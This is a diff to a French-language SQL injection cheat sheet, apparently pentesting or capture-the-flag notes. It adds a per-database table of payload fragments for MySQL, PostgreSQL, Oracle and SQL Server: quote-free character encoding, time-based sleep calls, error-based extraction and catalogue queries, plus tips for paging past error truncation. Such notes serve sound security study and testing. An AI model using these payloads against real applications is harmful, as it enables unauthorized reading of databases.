@@ -63,6 +63,31 @@ envoyer  ,'a'  → si l'erreur montre  ''a''  → littéraux interdits (addslash
                → contourner : chr(97)||chr...  current_schema()  0x hex
 ```
 
+## Table de correspondance SGBD
+
+Identifier le SGBD (Recon étape 2), lire la colonne, adapter le payload. `(SQ)` = sous-requête scalaire.
+
+| Opération        | MySQL                             | PostgreSQL           | Oracle                       | MS SQL Server        |
+|------------------|-----------------------------------|----------------------|------------------------------|----------------------|
+| concat           | `CONCAT(a,b)`                     | `a\|\|b`             | `a\|\|b`                     | `a+b`                |
+| sous-chaîne      | `SUBSTRING(s,p,l)`                | `SUBSTR(s,p,l)`      | `SUBSTR(s,p,l)`              | `SUBSTRING(s,p,l)`   |
+| longueur         | `LENGTH()`                       | `LENGTH()`           | `LENGTH()`                   | `LEN()`              |
+| version          | `@@version`                      | `version()`          | `banner FROM v$version`      | `@@version`          |
+| base courante    | `database()`                     | `current_database()` | `ora_database_name`          | `DB_NAME()`          |
+| char sans quote  | `CHAR(65)` / `0x41`              | `chr(65)`            | `CHR(65)`                    | `CHAR(65)` / `0x41`  |
+| lignes → 1 col   | `GROUP_CONCAT(c SEPARATOR ',')`  | `string_agg(c,',')`  | `LISTAGG(c,',')`             | `STRING_AGG` / `FOR XML PATH` |
+| n-ième ligne     | `LIMIT n,1`                      | `LIMIT 1 OFFSET n`   | `OFFSET n ROWS FETCH NEXT 1` | `OFFSET n ROWS FETCH NEXT 1` |
+| sleep            | `SLEEP(5)`                       | `pg_sleep(5)`        | `dbms_pipe.receive_message(('a'),5)` | `WAITFOR DELAY '0:0:5'` |
+| error extract    | `extractvalue(1,concat(0x7e,(SQ)))` | `cast((SQ) as int)` | rare → passer en blind    | `cast((SQ) as int)`  |
+| catalogue        | `information_schema.tables/.columns` | idem             | `all_tables/all_tab_columns` | `information_schema` idem |
+
+Pièges :
+
+- **Substring 1-indexé** dans les quatre SGBD (le 1er caractère est en position 1).
+- **`--` MySQL exige un espace après** (`-- `), sinon `#` ou `/**/`.
+- **`extractvalue`/`updatexml` MySQL tronquent à 32 car.** → paginer `SUBSTRING((SQ),1,32)` puis `,33,32`.
+- **`cast as int` (PG/MSSQL)** : la valeur non numérique remonte dans `invalid input syntax for integer: "..."` — canal error-based sans troncature.
+
 ## SQL Truncation
 
 Vuln de stockage, pas d'injection (zéro métacaractère). MySQL non-strict tronque `VARCHAR(n)` en silence, et `=` complète avec des espaces. On duplique un compte existant (`admin`) avec son propre mot de passe.
@@ -191,7 +216,7 @@ Forcer une erreur (division par zéro) quand la condition est vraie ; pas d'erre
 
 ### Exploiter un message d'erreur verbeux
 
-Quand la base renvoie le détail de l'erreur, on y lit la donnée directement. Le payload dépend du SGBD (cf. Recon étape 2).
+Quand la base renvoie le détail de l'erreur, on y lit la donnée directement. Le payload dépend du SGBD (cf. Recon étape 2 + table de correspondance).
 
 1. Vérifier que le point est exploitable.
 2. Vérifier la syntaxe :
